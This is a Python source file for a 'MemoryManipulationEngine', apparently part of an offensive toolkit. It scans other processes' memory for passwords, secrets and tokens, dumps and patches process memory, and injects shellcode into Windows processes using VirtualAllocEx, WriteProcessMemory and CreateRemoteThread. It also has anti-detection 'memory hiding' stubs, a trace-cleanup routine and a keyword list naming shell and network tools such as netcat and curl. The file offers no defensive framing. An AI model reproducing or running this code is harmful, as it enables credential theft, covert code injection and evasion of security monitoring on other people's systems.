import logging
import time
import psutil
import ctypes
import struct
import threading
import platform
import os
from typing import Dict, List, Tuple, Optional, Any
from ctypes import wintypes

class MemoryManipulationEngine:
    """
    Comprehensive memory manipulation engine with process memory scanning,
    injection, and manipulation capabilities.
    """
    def __init__(self):
        self.logger = logging.getLogger("MemoryManipulationEngine")
        self.initialized = False
        self.memory_scan_active = False
        self.injection_active = False
        self.scanned_processes = {}
        self.injected_processes = {}
        self.memory_patterns = {}

    def initialize(self):
        """Initialize the memory manipulation engine"""
        self.logger.info("[Memory] Memory manipulation engine initializing...")
        
        # Check for required privileges
        if not self._check_privileges():
            self.logger.warning("[Memory] Insufficient privileges for advanced memory operations")
        
        # Initialize memory patterns
        self._initialize_memory_patterns()
        
        self.initialized = True
        self.logger.info("[Memory] Memory manipulation engine initialized successfully")

    def manipulation_loop(self):
        """Main memory manipulation loop"""
        while True:
            try:
                self.logger.debug("[Memory] Running memory manipulation loop...")
                
                # Monitor process memory usage
                self._monitor_process_memory()
                
                # Scan for interesting memory patterns
                if self.memory_scan_active:
                    self._scan_memory_patterns()
                
                # Check for memory anomalies
                self._detect_memory_anomalies()
                
                # Maintain injected processes
                if self.injection_active:
                    self._maintain_injections()
                
                time.sleep(30)  # Run every 30 seconds
                
            except Exception as e:
                self.logger.error(f"[Memory] Error in manipulation loop: {e}")
                time.sleep(60)

    def execute_manipulation(self, params=None):
        """Execute specific memory manipulation tasks"""
        if not params:
            return
            
        operation = params.get("operation")
        
        if operation == "memory_scan":
            process_name = params.get("process_name")
            pattern = params.get("pattern")
            self.scan_process_memory(process_name, pattern)
            
        elif operation == "memory_inject":
            process_name = params.get("process_name")
            shellcode = params.get("shellcode")
            self.inject_shellcode(process_name, shellcode)
            
        elif operation == "memory_dump":
            process_name = params.get("process_name")
            output_path = params.get("output_path")
            self.dump_process_memory(process_name, output_path)
            
        elif operation == "memory_patch":
            process_name = params.get("process_name")
            address = params.get("address")
            patch_data = params.get("patch_data")
            self.patch_memory(process_name, address, patch_data)
            
        elif operation == "memory_hide":
            process_name = params.get("process_name")
            self.hide_process_memory(process_name)
            
        else:
            self.logger.warning(f"[Memory] Unknown manipulation operation: {operation}")

    def check_manipulation_status(self):
        """Check the status of memory manipulation activities"""
        status = {
            "initialized": self.initialized,
            "memory_scan_active": self.memory_scan_active,
            "injection_active": self.injection_active,
            "scanned_processes": len(self.scanned_processes),
            "injected_processes": len(self.injected_processes),
            "memory_patterns": len(self.memory_patterns)
        }
        
        self.logger.info(f"[Memory] Status: {status}")
        return status

    def cleanup(self):
        """Clean up memory manipulation traces"""
        self.logger.info("[Memory] Cleaning up memory manipulation traces...")
        
        # Stop memory scanning
        if self.memory_scan_active:
            self.stop_memory_scan()
        
        # Stop injections
        if self.injection_active:
            self.stop_injections()
        
        # Clear data
        self.scanned_processes.clear()
        self.injected_processes.clear()
        self.memory_patterns.clear()
        
        self.logger.info("[Memory] Memory manipulation cleanup complete")

    def scan_process_memory(self, process_name: str = None, pattern: str = None):
        """Scan process memory for specific patterns"""
        try:
            self.logger.info(f"[Memory] Starting memory scan for pattern: {pattern}")
            
            if not pattern:
                pattern = "password|secret|key|token|credential"
            
            # Compile pattern
            import re
            regex = re.compile(pattern, re.IGNORECASE)
            
            found_patterns = []
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if process_name and proc.info['name'] != process_name:
                        continue
                    
                    pid = proc.info['pid']
                    proc_name = proc.info['name']
                    
                    # Scan process memory
                    if platform.system() == "Windows":
                        patterns = self._scan_windows_process_memory(pid, regex)
                    else:
                        patterns = self._scan_unix_process_memory(pid, regex)
                    
                    if patterns:
                        found_patterns.extend(patterns)
                        self.logger.info(f"[Memory] Found {len(patterns)} patterns in {proc_name} (PID: {pid})")
                        
                except Exception as e:
                    self.logger.debug(f"[Memory] Failed to scan process {proc.info['name']}: {e}")
                    continue
            
            # Store results
            self.memory_patterns[pattern] = found_patterns
            
            self.logger.info(f"[Memory] Memory scan complete. Found {len(found_patterns)} patterns")
            return found_patterns
            
        except Exception as e:
            self.logger.error(f"[Memory] Memory scan failed: {e}")
            return []

    def inject_shellcode(self, process_name: str, shellcode: bytes):
        """Inject shellcode into a process"""
        try:
            self.logger.info(f"[Memory] Injecting shellcode into {process_name}")
            
            # Find target process
            target_proc = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    target_proc = proc
                    break
            
            if not target_proc:
                self.logger.error(f"[Memory] Process {process_name} not found")
                return False
            
            pid = target_proc.info['pid']
            
            if platform.system() == "Windows":
                success = self._inject_windows_shellcode(pid, shellcode)
            else:
                success = self._inject_unix_shellcode(pid, shellcode)
            
            if success:
                self.injected_processes[pid] = {
                    "name": process_name,
                    "shellcode_size": len(shellcode),
                    "injection_time": time.time()
                }
                self.logger.info(f"[Memory] Shellcode injected successfully into {process_name}")
                return True
            else:
                self.logger.error(f"[Memory] Failed to inject shellcode into {process_name}")
                return False
                
        except Exception as e:
            self.logger.error(f"[Memory] Shellcode injection failed: {e}")
            return False

    def dump_process_memory(self, process_name: str, output_path: str):
        """Dump process memory to file"""
        try:
            self.logger.info(f"[Memory] Dumping memory for {process_name} to {output_path}")
            
            # Find target process
            target_proc = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    target_proc = proc
                    break
            
            if not target_proc:
                self.logger.error(f"[Memory] Process {process_name} not found")
                return False
            
            pid = target_proc.info['pid']
            
            if platform.system() == "Windows":
                success = self._dump_windows_process_memory(pid, output_path)
            else:
                success = self._dump_unix_process_memory(pid, output_path)
            
            if success:
                self.logger.info(f"[Memory] Memory dump completed: {output_path}")
                return True
            else:
                self.logger.error(f"[Memory] Memory dump failed")
                return False
                
        except Exception as e:
            self.logger.error(f"[Memory] Memory dump failed: {e}")
            return False

    def patch_memory(self, process_name: str, address: int, patch_data: bytes):
        """Patch memory at specific address"""
        try:
            self.logger.info(f"[Memory] Patching memory at 0x{address:x} in {process_name}")
            
            # Find target process
            target_proc = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    target_proc = proc
                    break
            
            if not target_proc:
                self.logger.error(f"[Memory] Process {process_name} not found")
                return False
            
            pid = target_proc.info['pid']
            
            if platform.system() == "Windows":
                success = self._patch_windows_memory(pid, address, patch_data)
            else:
                success = self._patch_unix_memory(pid, address, patch_data)
            
            if success:
                self.logger.info(f"[Memory] Memory patch completed successfully")
                return True
            else:
                self.logger.error(f"[Memory] Memory patch failed")
                return False
                
        except Exception as e:
            self.logger.error(f"[Memory] Memory patch failed: {e}")
            return False

    def hide_process_memory(self, process_name: str):
        """Hide process memory from detection"""
        try:
            self.logger.info(f"[Memory] Hiding memory for {process_name}")
            
            # Find target process
            target_proc = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    target_proc = proc
                    break
            
            if not target_proc:
                self.logger.error(f"[Memory] Process {process_name} not found")
                return False
            
            pid = target_proc.info['pid']
            
            if platform.system() == "Windows":
                success = self._hide_windows_process_memory(pid)
            else:
                success = self._hide_unix_process_memory(pid)
            
            if success:
                self.logger.info(f"[Memory] Process memory hidden successfully")
                return True
            else:
                self.logger.error(f"[Memory] Failed to hide process memory")
                return False
                
        except Exception as e:
            self.logger.error(f"[Memory] Memory hiding failed: {e}")
            return False

    def start_memory_scan(self):
        """Start continuous memory scanning"""
        self.logger.info("[Memory] Starting continuous memory scanning...")
        self.memory_scan_active = True

    def stop_memory_scan(self):
        """Stop continuous memory scanning"""
        self.logger.info("[Memory] Stopping continuous memory scanning...")
        self.memory_scan_active = False

    def start_injections(self):
        """Start continuous injection monitoring"""
        self.logger.info("[Memory] Starting continuous injection monitoring...")
        self.injection_active = True

    def stop_injections(self):
        """Stop continuous injection monitoring"""
        self.logger.info("[Memory] Stopping continuous injection monitoring...")
        self.injection_active = False

    def _check_privileges(self) -> bool:
        """Check if we have sufficient privileges for memory operations"""
        try:
            if platform.system() == "Windows":
                # On Windows, check if running as administrator
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                # On Unix-like systems, check if we can access /proc
                return os.access("/proc", os.R_OK)
        except Exception:
            return False

    def _initialize_memory_patterns(self):
        """Initialize common memory patterns to search for"""
        self.common_patterns = {
            "credentials": [
                rb"password",
                rb"secret",
                rb"key",
                rb"token",
                rb"credential",
                rb"auth",
                rb"login"
            ],
            "network": [
                rb"http://",
                rb"https://",
                rb"ftp://",
                rb"ssh://",
                rb"192.168.",
                rb"10.0.",
                rb"172.16."
            ],
            "malware": [
                rb"cmd.exe",
                rb"powershell",
                rb"wget",
                rb"curl",
                rb"nc ",
                rb"netcat"
            ]
        }

    def _monitor_process_memory(self):
        """Monitor process memory usage"""
        try:
            for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                try:
                    mem_info = proc.info['memory_info']
                    mem_mb = mem_info.rss / (1024 * 1024)
                    
                    # Log processes using significant memory
                    if mem_mb > 100:  # More than 100MB
                        self.logger.debug(f"[Memory] {proc.info['name']} (PID: {proc.info['pid']}): {mem_mb:.1f} MB")
                        
                except Exception:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"[Memory] Process memory monitoring failed: {e}")

    def _scan_memory_patterns(self):
        """Scan for memory patterns in active processes"""
        try:
            for pattern_type, patterns in self.common_patterns.items():
                for pattern in patterns:
                    found = self.scan_process_memory(pattern=pattern.decode())
                    if found:
                        self.logger.info(f"[Memory] Found {pattern_type} patterns: {len(found)} matches")
                        
        except Exception as e:
            self.logger.error(f"[Memory] Pattern scanning failed: {e}")

    def _detect_memory_anomalies(self):
        """Detect memory anomalies and suspicious activity"""
        try:
            for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                try:
                    mem_info = proc.info['memory_info']
                    mem_mb = mem_info.rss / (1024 * 1024)
                    
                    # Check for unusual memory usage
                    if mem_mb > 1000:  # More than 1GB
                        self.logger.warning(f"[Memory] High memory usage: {proc.info['name']} (PID: {proc.info['pid']}): {mem_mb:.1f} MB")
                    
                    # Check for memory growth
                    if proc.info['pid'] in self.scanned_processes:
                        prev_mem = self.scanned_processes[proc.info['pid']]['memory']
                        if mem_mb > prev_mem * 2:  # Memory doubled
                            self.logger.warning(f"[Memory] Rapid memory growth: {proc.info['name']} (PID: {proc.info['pid']}): {prev_mem:.1f} MB -> {mem_mb:.1f} MB")
                    
                    # Update memory tracking
                    self.scanned_processes[proc.info['pid']] = {
                        'name': proc.info['name'],
                        'memory': mem_mb,
                        'timestamp': time.time()
                    }
                    
                except Exception:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"[Memory] Anomaly detection failed: {e}")

    def _maintain_injections(self):
        """Maintain active injections"""
        try:
            current_time = time.time()
            to_remove = []
            
            for pid, info in self.injected_processes.items():
                # Check if process still exists
                try:
                    proc = psutil.Process(pid)
                    if not proc.is_running():
                        to_remove.append(pid)
                        self.logger.info(f"[Memory] Injected process {info['name']} (PID: {pid}) has terminated")
                except psutil.NoSuchProcess:
                    to_remove.append(pid)
                    self.logger.info(f"[Memory] Injected process {info['name']} (PID: {pid}) no longer exists")
            
            # Remove terminated processes
            for pid in to_remove:
                del self.injected_processes[pid]
                
        except Exception as e:
            self.logger.error(f"[Memory] Injection maintenance failed: {e}")

    def _scan_windows_process_memory(self, pid: int, regex) -> List[str]:
        """Scan Windows process memory"""
        try:
            import win32process
            import win32api
            import win32con
            
            # Open process
            handle = win32api.OpenProcess(win32con.PROCESS_VM_READ | win32con.PROCESS_QUERY_INFORMATION, False, pid)
            
            found_patterns = []
            
            # Get memory regions
            mbi = win32process.VirtualQueryEx(handle, 0)
            address = 0
            
            while address < 0x7FFFFFFF:
                try:
                    mbi = win32process.VirtualQueryEx(handle, address)
                    if mbi.State == win32con.MEM_COMMIT and mbi.Protect & win32con.PAGE_READABLE:
                        # Read memory
                        try:
                            data = win32process.ReadProcessMemory(handle, address, mbi.RegionSize)
                            matches = regex.findall(data)
                            if matches:
                                found_patterns.extend([match.decode('utf-8', errors='ignore') for match in matches])
                        except Exception:
                            pass
                    
                    address = mbi.BaseAddress + mbi.RegionSize
                except Exception:
                    break
            
            win32api.CloseHandle(handle)
            return found_patterns
            
        except Exception as e:
            self.logger.debug(f"[Memory] Windows memory scan failed: {e}")
            return []

    def _scan_unix_process_memory(self, pid: int, regex) -> List[str]:
        """Scan Unix process memory"""
        try:
            found_patterns = []
            
            # Read /proc/{pid}/maps
            maps_file = f"/proc/{pid}/maps"
            if not os.path.exists(maps_file):
                return []
            
            with open(maps_file, 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 5 and 'r' in parts[1]:  # Readable memory
                        try:
                            addr_range = parts[0].split('-')
                            start_addr = int(addr_range[0], 16)
                            end_addr = int(addr_range[1], 16)
                            
                            # Read memory
                            mem_file = f"/proc/{pid}/mem"
                            with open(mem_file, 'rb') as mem:
                                mem.seek(start_addr)
                                data = mem.read(end_addr - start_addr)
                                matches = regex.findall(data)
                                if matches:
                                    found_patterns.extend([match.decode('utf-8', errors='ignore') for match in matches])
                        except Exception:
                            continue
            
            return found_patterns
            
        except Exception as e:
            self.logger.debug(f"[Memory] Unix memory scan failed: {e}")
            return []

    def _inject_windows_shellcode(self, pid: int, shellcode: bytes) -> bool:
        """Inject shellcode into Windows process"""
        try:
            import win32process
            import win32api
            import win32con
            
            # Open process
            handle = win32api.OpenProcess(
                win32con.PROCESS_CREATE_THREAD | win32con.PROCESS_VM_OPERATION | 
                win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_READ,
                False, pid
            )
            
            # Allocate memory
            addr = win32process.VirtualAllocEx(handle, 0, len(shellcode), 
                                             win32con.MEM_COMMIT, win32con.PAGE_EXECUTE_READWRITE)
            
            # Write shellcode
            win32process.WriteProcessMemory(handle, addr, shellcode, len(shellcode))
            
            # Create thread
            thread_id = win32process.CreateRemoteThread(handle, None, 0, addr, None, 0)
            
            win32api.CloseHandle(handle)
            return True
            
        except Exception as e:
            self.logger.error(f"[Memory] Windows shellcode injection failed: {e}")
            return False

    def _inject_unix_shellcode(self, pid: int, shellcode: bytes) -> bool:
        """Inject shellcode into Unix process"""
        try:
            # This is a simplified version - in practice you'd use ptrace
            # or other process injection techniques
            self.logger.warning("[Memory] Unix shellcode injection not fully implemented")
            return False
            
        except Exception as e:
            self.logger.error(f"[Memory] Unix shellcode injection failed: {e}")
            return False

    def _dump_windows_process_memory(self, pid: int, output_path: str) -> bool:
        """Dump Windows process memory"""
        try:
            import win32process
            import win32api
            import win32con
            
            # Open process
            handle = win32api.OpenProcess(win32con.PROCESS_VM_READ | win32con.PROCESS_QUERY_INFORMATION, False, pid)
            
            with open(output_path, 'wb') as f:
                address = 0
                while address < 0x7FFFFFFF:
                    try:
                        mbi = win32process.VirtualQueryEx(handle, address)
                        if mbi.State == win32con.MEM_COMMIT:
                            try:
                                data = win32process.ReadProcessMemory(handle, address, mbi.RegionSize)
                                f.write(data)
                            except Exception:
                                pass
                        address = mbi.BaseAddress + mbi.RegionSize
                    except Exception:
                        break
            
            win32api.CloseHandle(handle)
            return True
            
        except Exception as e:
            self.logger.error(f"[Memory] Windows memory dump failed: {e}")
            return False

    def _dump_unix_process_memory(self, pid: int, output_path: str) -> bool:
        """Dump Unix process memory"""
        try:
            with open(f"/proc/{pid}/mem", 'rb') as mem:
                with open(output_path, 'wb') as f:
                    f.write(mem.read())
            return True
            
        except Exception as e:
            self.logger.error(f"[Memory] Unix memory dump failed: {e}")
            return False

    def _patch_windows_memory(self, pid: int, address: int, patch_data: bytes) -> bool:
        """Patch Windows process memory"""
        try:
            import win32process
            import win32api
            import win32con
            
            # Open process
            handle = win32api.OpenProcess(win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_OPERATION, False, pid)
            
            # Change memory protection
            old_protect = win32process.VirtualProtectEx(handle, address, len(patch_data), win32con.PAGE_READWRITE)
            
            # Write patch data
            win32process.WriteProcessMemory(handle, address, patch_data, len(patch_data))
            
            # Restore memory protection
            win32process.VirtualProtectEx(handle, address, len(patch_data), old_protect)
            
            win32api.CloseHandle(handle)
            return True
            
        except Exception as e:
            self.logger.error(f"[Memory] Windows memory patch failed: {e}")
            return False

    def _patch_unix_memory(self, pid: int, address: int, patch_data: bytes) -> bool:
        """Patch Unix process memory"""
        try:
            # This would require ptrace or similar process manipulation
            self.logger.warning("[Memory] Unix memory patching not fully implemented")
            return False
            
        except Exception as e:
            self.logger.error(f"[Memory] Unix memory patch failed: {e}")
            return False

    def _hide_windows_process_memory(self, pid: int) -> bool:
        """Hide Windows process memory from detection"""
        try:
            # This would involve various anti-forensic techniques
            # such as memory encryption, process hollowing, etc.
            self.logger.warning("[Memory] Windows memory hiding not fully implemented")
            return False
            
        except Exception as e:
            self.logger.error(f"[Memory] Windows memory hiding failed: {e}")
            return False

    def _hide_unix_process_memory(self, pid: int) -> bool:
        """Hide Unix process memory from detection"""
        try:
            # This would involve various anti-forensic techniques
            self.logger.warning("[Memory] Unix memory hiding not fully implemented")
            return False
            
        except Exception as e:
            self.logger.error(f"[Memory] Unix memory hiding failed: {e}")
            return False 